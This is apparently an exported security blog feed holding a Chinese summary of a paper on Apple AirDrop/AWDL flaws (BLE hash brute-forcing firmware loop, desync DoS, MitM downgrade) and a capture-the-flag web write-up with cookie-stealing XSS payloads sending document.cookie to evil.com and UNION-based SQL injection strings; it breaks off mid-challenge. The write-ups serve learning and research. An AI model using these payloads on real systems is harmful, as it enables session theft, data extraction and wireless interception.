title="AirDrop分析"></a>AirDrop分析</h1><p>AirDrop是一个在苹果生态系统里很方便远程传输数据的服务，基于AWDL协议使用BLE与WiFi发现设备与传输数据。设备的AirDrop有三种不同的状态：可被所有人发现，仅限联系人发现和禁止任何AirDrop连接请求，在默认情况下设备会开始WiFi与BLE，并且设置为仅限联系人发现，此外设备需要被解锁后才可以被发现。</p><p>设备使用AirDrop传输数据一共需要经历三个阶段：服务发现，身份认证与数据传输，以传输照片为例，原论文作者提供的示意图如下图所示。<br><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ad.jpg"></p><h2 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h2><p>当照片发送方在照片分享界面中点击AirDrop(隔空投送)后，设备广播携带有设备联系人标识符哈希的BLE广播。照片接收方设备将定期扫描BLE广播，接收方发现BLE广播后，若接收方设备设置为仅允许联系人连接，则将BLE广播中的联系人标识符哈希与接收方设备通讯里中的联系人哈希进行比较，若至少有一个匹配则激活AWDL接口。若接收方设备设置为允许任何人连接，则直接激活AWDL接口。接收方激活AWDL后与集群进行AWDL同步，同步完成后发送方使用mDNS/DNS-SD通过AWDL接口向接收方请求AirDrop服务(在集群中发现AirDrop服务)，并计算出接收方的IPV6地址。</p><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><p>发送方将对集群中每一个发现了AirDrop服务的设备建立一个TLS的链接，通过向接收方发送HTTP Post请求(路径为/Discover)执行一个完整的身份认证握手，如果身份验证成功(返回HTTP 200 OK)，则该设备的图标将会出现在发送方的AirDrop分享界面中。</p><p>对于TLS链接，苹果有两种不同的链接方式：已认证链接(Authenticated Connection)和未认证链接(Unauthenticated Connection)，AirDrop默认尝试使用已认证链接进行认证建立TLS链接。已认证链接只能在拥有Apple ID并且互相存在于联系人通讯录的人之间建立。在AirDrop设置为仅联系人模式时只会使用已认证链接，而设置为允许任何人连接的模式下两种链接都会存在。经过已认证链接的身份认证后，AirDrop界面中将会显示接收方的姓名以及联系人照片，如果没有照片则显示联系人姓名首字母的大写。而未认证链接的身份认证后则不会显示任何照片与姓名，联系人头像的位置将会显示默认的头像(带有头部轮廓的灰色头像)，姓名则会被设备名所替代，原论文中的举例如下：<br><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ui.jpg"></p><p>为了进行身份验证，设备需要证明其拥有与Apple ID相关联的联系人标识符$c_i$(如电话，电子邮件)，该标识符必须存在于设备的联系人通讯录中。当用户使用Apple ID登录设备后，将会被分配一个唯一的UUID。在进行身份验证时会使用哈希散列形式的苹果签名的“记录数据(Record Data, RD)”，RD包含了设备UUID与所有设备中的通讯里联系人标识符$c_i$，其格式如下所示。<br>$$RD = UUID, SHA2(c_1), …, SHA2(c_n)$$</p><p>发送方之后对RD签名为$RD_s$，签名格式如下所示，其中s均代表苹果证书，sign代表使用$s_(VR)$对RD进行签名。<br>$$RD_s = RD, sign(s_(VR), RD), s_(VR), s_(AAI2)$$</p><p>在进行认证时接收方设备将会对其通讯录中的每个联系人标识符计算SHA2，并将其与$RD_s$中包含的哈希进行比较，验证设备UUID是否与当前TLS链接的证书相匹配。若发送方或接收方未能提供有效的经过苹果签名的TLS证书或者没有提供RD，则AirDrop会将其视为未认证链接。</p><p>注：在进行身份认证(POST /Discover)与传输请求(POST /Ask)时携带的数据均为RD，在第一阶段广播BLE时携带的数据并不是RD，虽然内容很像，但是只有通讯录联系人的部分哈希散列。</p><h2 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h2><p>当发送方在AirDrop界面中选择其中一个接收方后，双方将再次建立一个TLS链接，AirDrop将会向接收方发送一个包含文件元数据与缩略图的HTTP Post请求(路径为/Ask)。接收方收到请求后会弹出包含该文件缩略图的界面以提示用户是否决定接收该文件。若接收方决定接收(返回HTTP 200 OK)，则将继续启动数据传输过程，发送方会将文件使用HTTP Post到接收方的设备里(路径为/Upload)。</p><h1 id="强制激活AWDL"><a href="#强制激活AWDL" class="headerlink" title="强制激活AWDL"></a>强制激活AWDL</h1><p>苹果为了节省能源消耗规定AWDL必须显示激活(例如AirDrop使用BLE广播)。在AirDrop允许任何人的模式下任何设备的BLE广播都将会激活目标设备的AWDL接口，但是当AirDrop处于仅联系人的模式下，只有在BLE广播中存在目标设备中联系人哈希的情况下才会激活目标设备的AWDL接口。</p><p>由于广播BLE时携带的联系人散列仅为SHA2的前2个字节，因此可以通过暴力枚举目标设备中联系人哈希的方法来强制激活处于仅联系人模式下的AWDL接口，其枚举空间仅为<code>2^16=65535</code>，而一个BLE帧就可以携带4个联系人散列，因此在最坏的情况下攻击者只需要短时间发送16384个BLE帧就可以激活目标设备的AWDL。蓝牙标准规定每一个BLE帧的最小发送间隔为100 ms，则最多需要<code>16384*100/1000/60 ≈ 27</code>分钟遍历整个枚举空间，虽然标准规定的最小发送间隔是写在蓝牙固件中的，但是可以修改固件来绕过这个最小发送间隔，原论文作者使用了Nordic nRF51822，修改了最小发送间隔为0.625 ms，理论上仅需10.24 s就可以遍历整个枚举空间，原论文作者修改的固件源码如下，BLE同时监听37，38，39三个信道。另外原论文作者使用了另一个无线网卡以嗅探数据帧，当枚举成功后目标设备会向发送者发送AWDL同步动作帧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> *le_adv = airdrop_init_template()</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">uint16_t</span> h = <span class="number">0</span>; <span class="comment">/* loop */</span>; h += <span class="number">4</span>) &#123;</span><br><span class="line">airdrop_set_hashes(le_adv, h, h+<span class="number">1</span>, h+<span class="number">2</span>, h+<span class="number">3</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">uint16_t</span> chan = <span class="number">37</span>; chan &lt; <span class="number">40</span>; chan++) &#123;</span><br><span class="line">le_adv_tx(le_adv, chan);</span><br><span class="line">sleep(<span class="number">0.625</span> <span class="comment">/* in milliseconds */</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原论文作者最后通过实验(假设BLE扫描窗口/持续时间为30 ms，扫描间隔为300 ms)发现当通讯录中仅有10个人时，平均10秒就可以成功枚举出散列，当通讯录人数超过100人时仅需不到1秒，通讯录人数越多，暴破速度越快，此外原论文作者统计发现平均每一个用户都有超过136个联系人，因此该攻击方法在现实中是相当可行的。</p><h1 id="用户隐私泄露"><a href="#用户隐私泄露" class="headerlink" title="用户隐私泄露"></a>用户隐私泄露</h1><p>为了保护用户隐私安全，避免用户被追踪，所有的苹果设备均实现了MAC地址随机化，但是AWDL动作帧中还是包含了部分用户敏感信息。</p><ol><li>设备UUID，在AirDrop进行身份认证时会携带设备的UUID，UUID的作用就是可以唯一确定一台与Apple ID相关联的设备。</li><li>Hostname，当用户设置一台新的苹果设备时，苹果设备默认将会在设备主机名中加入用户名的一部分，例如“Jane-iPhone”，“王丽的iPhone”等等，而用户也更倾向于此配置以方便朋友可以快速找到自己，当攻击者获取部分用户姓名以后可以通过差分隐私获取用户更多信息。</li><li>真实的MAC地址，设备所连接的AP(主节点)，在部分AWDL动作帧中会加入这些字段。</li><li>设备操作系统，部分AWDL动作帧中携带了操作系统信息，甚至可以通过AWDL版本确定设备的操作系统版本，例如macOS 10.12使用AWDL v2，macOS 10.13使用AWDL v3等等。</li></ol><p>以上用户隐私信息均可以通过发送特定的AWDL动作帧或BLE广播帧触发，用户可以通过完全禁用(在需要使用的时候打开)AirDrop来保护隐私，这使得BLE广播无法激活AWDL接口。</p><h1 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h1><p>AWDL协议在设计上并没有考虑安全性，而是将帧传输的安全性交给应用层去处理(例如AirDrop使用TLS进行设备身份认证)，因此AWDL的帧是可以任意伪造的。在AWDL集群中，若两个节点想要进行通信就需要保持同步，同步操作主要由主节点完成，同步完成后两个节点就可以同时(在同一个EAW里)使用同一个信道进行通信，但是由于AWDL协议里的包括同步帧的动作帧都是可以伪造的，因此可以伪造同步帧强行偏移信道序列，使两个目标无法同时在同一个信道上通信，即去同步化(Desynchronize)形成DOS攻击。该攻击主要需要以下三个条件：</p><ol><li>至少要成为两台设备的主节点，这样才可以发送动作帧。为了成为主节点就需要赢得选举，在AWDL集群中选举主要与节点的主指标与计数器这两个值相关，为了赢得选举则需要手动指定范围内最大的主度量与计数器。</li><li>可以分别与这两台设备进行单独通信，为了避免同时影响集群中的其他设备，只能使用单播向目标设备通信。</li><li>分别向两台设备发送不同的包括信道序列的同步参数TLV，从而导致两台设备相互重合的信道最少。</li></ol><p>原论文作者提供了相应的<a href="https://youtu.be/M5D9NeKapUo">演示视频</a>。上述攻击主要通过伪造AWDL动作帧实现去同步化使两个设备无法在同一信道中通信，可以规定AWDL集群中的节点不接受单播帧来防止此类攻击。</p><h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h1><p>该中间人攻击主要针对AirDrop，其主要原理是通过强行将已认证连接降级为未认证连接，攻击者使用未认证连接冒充真正的接收方从而拦截数据。在前文中提到AirDrop由两种不同的身份认证链接：已认证链接和未认证链接，经过已认证链接(接收方与发送方互相在对方的通讯录中)的接收方在发送方的AirDrop界面会显示接收方在发送方通讯中的姓名与照片(若没有照片则显示姓名首字母大写)，经过未认证链接则只会显示接收方默认头像与设备名，这时接收方就可以巧妙的修改设备名使其类似于真实的姓名以欺骗发送方，于是发送方用以区分联系人是否经过认证的唯一方式只有通过观察接收方的头像。</p><p>进行中间人攻击主要有三个阶段：中断发送方的设备发现服务使真正的接收方无法被发现，降级已认证链接为未认证链接，实施中间人攻击拦截并修改传输数据。</p><h2 id="中断设备发现"><a href="#中断设备发现" class="headerlink" title="中断设备发现"></a>中断设备发现</h2><p>首先需要防止数据的发送方发现真正的接收方，这样攻击者才可以冒充接收方拦截数据。中断设备发现可以通过前文中的去同步DOS攻击来实现，通过单播使目标AWDL节点同步失败，无法完成完整的AirDrop服务发现过程，真正的接收方就不会出现在发送方的AirDrop界面中，但是原论文作者在实验中发现在服务发现过程开始的时候发送方设备会增加信道的分配，使得两个设备之间信道的重合率上升，DOS攻击的效果下降。可以使用一种替代方案：TCP重置攻击，通过伪造TCP重置包使RST标志位设置为1来强制中断TCP链接。</p><h2 id="降级认证链接"><a href="#降级认证链接" class="headerlink" title="降级认证链接"></a>降级认证链接</h2><p>当攻击者使用自签名的证书而不是苹果的证书时，发送方会采用未认证链接，由于未认证链接仅存在与AirDrop允许任何人连接的模式下，若发送方设备处于仅联系人的模式，则可以使用前文中的DOS攻击强迫发送方切换至允许任何人连接的模式。当未认证连接成功后，经过巧妙设计的攻击者设备名就会出现在发送方的AirDrop界面中，但是头像却是默认头像，这对于发送方来说可能并不会注意到这个变化。</p><h2 id="拦截并修改数据"><a href="#拦截并修改数据" class="headerlink" title="拦截并修改数据"></a>拦截并修改数据</h2><p>当接收方通过攻击者AirDrop服务发现以后，就可以开始等待发送方启动HTTPS握手(发送方与攻击者握手，攻击者与接收方握手，就建立了两个TLS链接)，当攻击者收到来自发送方/Ask或/Upload请求后即可转发给接收方，或者修改请求中的数据实现中间人攻击。原论文作者提供的攻击示意图如下。<br><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/mitm.jpg"></p><p>原论文作者提供了相应的<a href="https://youtu.be/5T7Qatoh0Vo">演示视频</a>。对于缓解措施，原论文作者建议苹果修改AirDrop的AI使得未认证链接设备更加醒目，此外还建议添加当设备在允许任何连接模式下经过一段超时时间后就自动将AirDrop调整为仅联系人的模式的设置，这样就可以有效避免未认证的链接。</p>]]></content>
    
    
    <summary type="html">苹果AWDL传输协议内容及漏洞分析</summary>
    
    
    
    <category term="Paper" scheme="https://srpopty.github.io/categories/Paper/"/>
    
    
    <category term="Wireless" scheme="https://srpopty.github.io/tags/Wireless/"/>
    
  </entry>
  
  <entry>
    <title>BlueWhale OJ Web WriteUp Part 1</title>
    <link href="https://srpopty.github.io/2020/08/05/BlueWhaleOJ-Web-WriteUp-Part1/"/>
    <id>https://srpopty.github.io/2020/08/05/BlueWhaleOJ-Web-WriteUp-Part1/</id>
    <published>2020-08-05T09:22:10.000Z</published>
    <updated>2021-07-31T12:53:08.330Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Welcome-to-web-5"><a href="#Welcome-to-web-5" class="headerlink" title="Welcome to web(5)"></a>Welcome to web(5)</h1><p>Web签到题，进入php0给一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;key&#x27;</span>] == <span class="string">&#x27;areyousure&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;For this exercise, flag is: ******&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提交GET参数key，值为areyousure，就可以得到flag<br><code>flag&#123;We1C0me_to_W3b&#125;</code></p><hr><h1 id="Calculator-25"><a href="#Calculator-25" class="headerlink" title="Calculator(25)"></a>Calculator(25)</h1><p>给了一道简单的计算题，但是数字很大，要在1.5秒内算出来，手算根本不可能，这时候就需要借助脚本的帮助。<br>后端的逻辑是用户第一次访问的时候给一道计算题，这时候生成一个session，服务器凭借这个session来判断用户时候已经领取过一个计算题，如果已经领取过就接受用户的答案。<br>可以用Python在第一次GET获取计算表达式以后保存session，然后再用这个session把答案发过去，可以用正则表达式提取第一次Get获取的网页中的计算表达式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://vps1.blue-whale.me:23331/calculator/&#x27;</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line">ret = sess.get(url).content</span><br><span class="line">exp = re.findall(<span class="string">r&#x27;&lt;span id=&quot;exp&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>, ret)[<span class="number">0</span>]</span><br><span class="line">ans = str(eval(exp.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)))</span><br><span class="line"><span class="keyword">print</span> exp + ans</span><br><span class="line"><span class="keyword">print</span> sess.get(url + <span class="string">&#x27;?answer=&#x27;</span> + ans).content</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以用JavaScript直接再网页上操作计算答案然后再自动提交，不过手速要快一点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;answer&#x27;</span>)[<span class="number">0</span>].value=<span class="built_in">eval</span>(<span class="built_in">document</span>.getElementById(<span class="string">&#x27;exp&#x27;</span>).innerText.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;form&#x27;</span>)[<span class="number">0</span>].submit();</span><br></pre></td></tr></table></figure><p>答案正确并且在1.5秒内提交即可获取flag<br><code>flag&#123;yes_you_are_calculat0r&#125;</code></p><hr><h1 id="RapidTyping-50"><a href="#RapidTyping-50" class="headerlink" title="RapidTyping(50)"></a>RapidTyping(50)</h1><p>和Calculater差不多的套路，给一个很长的图片验证码，要求在2.5秒内输入，手工输入肯定是不可能的，查看网页源码可以发现验证码图片使用的是svg+xml，那么就代表所有的验证码都是直接用svg绘制的，并且验证码的字符就在网页上，svg的绘制内容采用base64编码，解码出以后再用正则表达式获取所有的验证码，需要注意的就是验证码是由顺序的，这个顺序要按照x的坐标顺序排列。</p><p>和Calculater一样，先Get获取验证码以后解出验证码在用同一个session发过去，可以用正则表达式提取svg的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://vps1.blue-whale.me:23331/captcha/&#x27;</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line">svg = base64.b64decode(</span><br><span class="line">    re.findall(<span class="string">r&#x27;&lt;img src=&quot;data:image/svg\+xml;base64,(.*?)&quot; /&gt;&#x27;</span>,</span><br><span class="line">               sess.get(url).content)[<span class="number">0</span>]</span><br><span class="line">)</span><br><span class="line">captchas = &#123;</span><br><span class="line">    int(item[<span class="number">0</span>]): item[<span class="number">1</span>] <span class="keyword">for</span> item <span class="keyword">in</span> re.findall(</span><br><span class="line">        <span class="string">r&#x27;&lt;text x=&quot;(\d+)&quot; y=&quot;\d+&quot; style=&quot;fill: rgb\(\d+, \d+, \d+\);&quot;&gt;(\w)&lt;/text&gt;&#x27;</span>, svg</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">captcha = <span class="string">&#x27;&#x27;</span>.join([captchas[x] <span class="keyword">for</span> x <span class="keyword">in</span> sorted(captchas.keys())])</span><br><span class="line"><span class="keyword">print</span> sess.get(url + <span class="string">&#x27;?code=&#x27;</span>+captcha).content</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以用Javascript，不过手速要快一点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">svg = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">svg.innerHTML = atob(<span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;img&#x27;</span>)[<span class="number">0</span>].src.substr(<span class="number">26</span>));</span><br><span class="line">captcha = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">text = <span class="built_in">Array</span>.from(svg.getElementsByTagName(<span class="string">&#x27;svg&#x27;</span>)[<span class="number">0</span>].getElementsByTagName(<span class="string">&#x27;text&#x27;</span>)).sort(</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">parseInt</span>(a.getAttribute(<span class="string">&#x27;x&#x27;</span>))-<span class="built_in">parseInt</span>(b.getAttribute(<span class="string">&#x27;x&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    ).forEach(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">        captcha += item.innerHTML;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;code&#x27;</span>)[<span class="number">0</span>].value = captcha;</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;form&#x27;</span>)[<span class="number">0</span>].submit();</span><br></pre></td></tr></table></figure><p>答案正确并且在2.5秒内解出即可获得flag<br><code>flag&#123;svg_C4P7cHa_n0t_$ecUr3&#125;</code></p><hr><h1 id="XSS1-75"><a href="#XSS1-75" class="headerlink" title="XSS1(75)"></a>XSS1(75)</h1><p>基本的XSS<br>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        $text = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $text = str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$text);</span><br><span class="line">        $text = str_replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$text);</span><br><span class="line">        $text = str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$text);</span><br><span class="line">        $text = str_replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;&#x27;</span>,$text);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;svg&gt;&lt;script&gt;var a=\&quot;&quot;</span>. $text . <span class="string">&quot;\&quot;&lt;/script&gt;&lt;/svg&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>过滤了双引号，尖括号和换行符，但是可以看到最后输出的位置是在svg的标签里，所以可以利用svg标签可以解析HTMl实体的特性完成注入。<br>测试payload如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;amp;quot;;alert(<span class="number">123</span>);<span class="keyword">var</span> b=&amp;amp;quot;</span><br></pre></td></tr></table></figure><p>先用<code>&amp;amp;quot;</code>闭合前面的双引号再加上<code>;</code>结束语句，后面就可以执行任意javascript代码了，最后再用一个<code>&amp;amp;quot;</code>闭合后面的双引号，或者也可以直接注释掉后面的双引号。</p><p>题目要求是拿到管理员的cookie，payload如下，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;amp;quot;;img=<span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);img.src=<span class="string">&#x27;http://evil.com/xss/?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);<span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;form&#x27;</span>)[<span class="number">0</span>].appendChild(img);<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>记得在输入的时候用url编码一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%26quot%3B%3Bimg%3Ddocument.createElement%28%27img%27%29%3Bimg.src%3D%27http%3A%2F%2Fevil.com%2Fxss%2F%3Fcookie%3D%27%2Bescape%28document.cookie%29%3Bdocument.getElementsByTagName%28%27form%27%29%5B0%5D.appendChild%28img%29%3B%2F%2F</span><br></pre></td></tr></table></figure><p>最后从cookie里获取flag<br><code>flag&#123;Br0wseR_F3atUre&#125;</code></p><hr><h1 id="XSS-2-75"><a href="#XSS-2-75" class="headerlink" title="XSS 2(75)"></a>XSS 2(75)</h1><p>这次没有直接给源码，输出的引号前面会被加上反斜杠转义，但是查看网页源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Wired filter<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;GBK&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Wired filter<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> a=<span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">autofocus</span>=<span class="string">&quot;autofocus&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到输出的网页上采用了GBK编码，可以用宽字节注入<br>测试payload为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%fa%<span class="number">22</span>;alert(<span class="number">1</span>);<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>在双字节编码中，前面的%fa加上反斜杠可以构成汉字“鶿”的编码，这样后面的双引号%22就可以成功逃逸，其他的引号可以使用<code>String.fromCharCode</code>绕过。</p><p>窃取cookie的payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%fa%22;img&#x3D;document.createElement(String.fromCharCode(105,109,103));img.src&#x3D;String.fromCharCode(104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,47,120,115,115,47,63,99,111,111,107,105,101,45)%2bescape%28document.cookie%29;document.getElementsByTagName(String.fromCharCode(98,111,100,121))[0].appendChild(img);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>最后获得flag为<br><code>flag&#123;GbK_is_3V1L&#125;</code></p><hr><h1 id="Basic-SQL-75"><a href="#Basic-SQL-75" class="headerlink" title="Basic SQL(75)"></a>Basic SQL(75)</h1><p>最基础的SQL注入，可以用SQLmap直接扫或者手工注入<br>首选用payload<code>&#39; or &#39;1&#39;=&#39;1</code>发现可以获取所有新闻，推测查询语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> <span class="keyword">search</span> <span class="keyword">like</span> <span class="string">&#x27;&#123;$_POST[&quot;search&quot;]&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>获取查询出的列数<br><code>a&#39; union select &#39;1&#39;,&#39;2&#39;,&#39;3</code></p><p>获取所有数据库<br><code>a&#39; union select &#39;1&#39;,(select group_concat(SCHEMA_NAME) from information_schema.schemata),&#39;3</code></p><p>获取当前数据库名<br><code>a&#39; union select &#39;1&#39;,database(),&#39;3</code></p><p>获取当前数据库的所有表名<br><code>a&#39; union select &#39;1&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#39;3</code></p><p>获取字段名<br><code>a&#39; union select &#39;1&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;f1agfl4gher3&#39;),&#39;3</code></p><p>获取flag<br><code>a&#39; union select &#39;1&#39;,(select h3r31sfl4g from f1agfl4gher3),&#39;3</code></p><p>最后得到flag为<br><code>flag&#123;sql_information_schema_hack&#125;</code></p><hr><h1 id="Basic-PHP-75"><a href="#Basic-PHP-75" class="headerlink" title="Basic PHP(75)"></a>Basic PHP(75)</h1><p>直接给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 